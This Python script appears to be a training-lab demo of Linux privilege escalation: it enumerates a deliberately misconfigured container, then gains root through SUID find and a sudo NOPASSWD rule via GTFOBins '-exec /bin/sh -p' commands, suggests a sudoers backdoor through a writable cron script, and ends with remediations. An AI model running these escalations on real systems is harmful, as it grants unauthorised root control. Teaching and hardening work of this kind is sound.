#!/usr/bin/env python3
"""
Linux privilege escalation demo — lab app server.

Simulates an attacker who has landed a shell as 'appuser' (uid=1001) and must
escalate to root.  Demonstrates three escalation vectors that linpeas surfaces:

  Vector 1 — SUID find (GTFOBins: sudo/find → shell)
  Vector 2 — Sudo NOPASSWD for find (same GTFOBins entry, higher confidence)
  Vector 3 — World-writable cron script running as root (persistence/escalation)

All three are planted misconfigurations in this container.  The demo:
  1. Enumerates the host from the perspective of appuser (uid=1001)
  2. Identifies vectors from the enumeration output
  3. Exploits Vector 1 (SUID) and Vector 2 (sudo) non-interactively
  4. Explains Vector 3 and the remediation for all three

> Only escalate on systems you own or have explicit written authorisation to test.
> This container is intentionally misconfigured; run it in the provided lab only.

Usage:
    python3 escalate.py          # full demo
"""
from __future__ import annotations

import os
import subprocess
import sys

DIVIDER = "─" * 64
UID_APPUSER = 1001


def run_as(uid: int, cmd: list[str], **kwargs) -> subprocess.CompletedProcess:
    """Run a command as a specific uid (drops privileges in the child process)."""
    def _drop():
        os.setgid(uid)
        os.setuid(uid)

    return subprocess.run(
        cmd,
        preexec_fn=_drop,
        capture_output=True,
        text=True,
        **kwargs,
    )


def run_root(cmd: list[str], **kwargs) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, **kwargs)


def demo() -> int:
    print("=" * 64)
    print("Linux Privilege Escalation — lab app server")
    print("Technique: SUID binary + sudo NOPASSWD + writable cron")
    print("=" * 64)

    # ── Step 1: Confirm we are a low-privilege user ───────────────────────
    print("\n[Step 1] Initial foothold — who are we?")
    print()
    r = run_as(UID_APPUSER, ["id"])
    print(f"  id:    {r.stdout.strip()}")
    r = run_as(UID_APPUSER, ["whoami"])
    print(f"  whoami: {r.stdout.strip()}")
    print()
    print("  We're appuser (uid=1001) — a low-privilege shell from RCE / initial access.")
    print("  Goal: escalate to root (uid=0).")

    # ── Step 2: Enumerate — SUID binaries ────────────────────────────────
    print(f"\n{DIVIDER}")
    print("[Step 2a] Enumeration — SUID binaries")
    print()
    r = run_as(UID_APPUSER, [
        "find", "/usr/bin", "/usr/local/bin", "/bin",
        "-perm", "-u=s", "-type", "f"
    ])
    suids = [s.strip() for s in r.stdout.splitlines() if s.strip()]
    for s in suids:
        # Check if it's in GTFOBins
        note = ""
        if "find" in s:
            note = "  ← GTFOBins: SUID + -exec → root shell"
        print(f"  {s}{note}")
    print()
    if any("find" in s for s in suids):
        print("  ✓ /usr/bin/find has SUID root — GTFOBins entry confirmed")

    # ── Step 3: Enumerate — sudo rules ──────────────────────────────────
    print(f"\n{DIVIDER}")
    print("[Step 2b] Enumeration — sudo rules (sudo -l)")
    print()
    r = run_as(UID_APPUSER, ["sudo", "-n", "-l"])
    for line in (r.stdout + r.stderr).splitlines():
        if line.strip():
            print(f"  {line}")
    print()
    if "find" in (r.stdout + r.stderr):
        print("  ✓ appuser can run /usr/bin/find as root without a password")

    # ── Step 4: Enumerate — world-writable cron scripts ─────────────────
    print(f"\n{DIVIDER}")
    print("[Step 2c] Enumeration — cron jobs + file permissions")
    print()
    r = run_root(["cat", "/etc/crontab"])
    for line in r.stdout.splitlines():
        line = line.strip()
        if line and not line.startswith("#"):
            # Check write permission as appuser
            parts = line.split()
            if len(parts) >= 6:
                script = parts[-1]
                wr = run_as(UID_APPUSER, ["test", "-w", script])
                writable = "  ← WRITABLE BY appuser!" if wr.returncode == 0 else ""
                print(f"  {line}{writable}")
    print()
    wr_check = run_as(UID_APPUSER, ["test", "-w", "/usr/local/bin/backup.sh"])
    if wr_check.returncode == 0:
        print("  ✓ /usr/local/bin/backup.sh runs as root every 5 minutes and is world-writable")
        print("    An attacker could append a payload: 'echo appuser ALL=(ALL) NOPASSWD: ALL >> /etc/sudoers'")

    # ── Step 5: Exploit Vector 1 — SUID find ─────────────────────────────
    print(f"\n{DIVIDER}")
    print("[Step 3] Exploit — Vector 1: SUID find (GTFOBins)")
    print()
    print("  GTFOBins technique:")
    print("    find /dev/null -exec /bin/sh -p -c id \\; -quit")
    print()
    print("  Mechanism: find runs with euid=0 (SUID). The -exec spawns sh -p,")
    print("  which preserves the elevated euid. The child command runs as root.")
    print()
    r = run_as(UID_APPUSER, [
        "/usr/bin/find", "/dev/null",
        "-exec", "/bin/sh", "-p", "-c", "id", ";",
        "-quit",
    ])
    out = (r.stdout + r.stderr).strip()
    print(f"  $ find /dev/null -exec sh -p -c id \\; -quit")
    print(f"  {out}")
    if "euid=0" in out or "uid=0" in out:
        print()
        print("  ✓ euid=0 confirmed via SUID find — execution as root achieved")

    # ── Step 6: Exploit Vector 2 — sudo find ─────────────────────────────
    print(f"\n{DIVIDER}")
    print("[Step 4] Exploit — Vector 2: sudo NOPASSWD find")
    print()
    print("  GTFOBins technique:")
    print("    sudo find /dev/null -exec /bin/sh -c id \\; -quit")
    print()
    r = run_as(UID_APPUSER, [
        "sudo", "/usr/bin/find", "/dev/null",
        "-exec", "/bin/sh", "-c", "id", ";",
        "-quit",
    ])
    out = (r.stdout + r.stderr).strip()
    print(f"  $ sudo find /dev/null -exec sh -c id \\; -quit")
    print(f"  {out}")
    if "uid=0" in out:
        print()
        print("  ✓ uid=0(root) — sudo rule escalation confirmed (higher confidence than SUID)")

    # ── Step 7: Remediations ─────────────────────────────────────────────
    print(f"\n{DIVIDER}")
    print("[Step 5] Remediations")
    print()
    rows = [
        ("SUID find",         "Remove SUID: chmod u-s /usr/bin/find"),
        ("sudo NOPASSWD find","Remove from /etc/sudoers (or use a safe binary only)"),
        ("Writable cron",     "chmod 750 /usr/local/bin/backup.sh && chown root:root it"),
        ("General audit",     "Run: find / -perm -u=s 2>/dev/null  +  sudo -l  +  cat /etc/crontab"),
        ("Hardening tool",    "CIS benchmark, lynis, or Ansible hardening role catches all three"),
    ]
    print(f"  {'Vector':<25}  Fix")
    print(f"  {'─'*25}  {'─'*38}")
    for vec, fix in rows:
        print(f"  {vec:<25}  {fix}")
    print()
    print("  The defender's version of this lab is module 07-endpoint-hardening")
    print("  in the defensive track — each privesc vector maps to a hardening check.")

    print(f"\n{'=' * 64}")
    print("Demo complete — three privesc vectors found and exploited")
    print(f"{'=' * 64}\n")
    return 0


if __name__ == "__main__":
    sys.exit(demo())
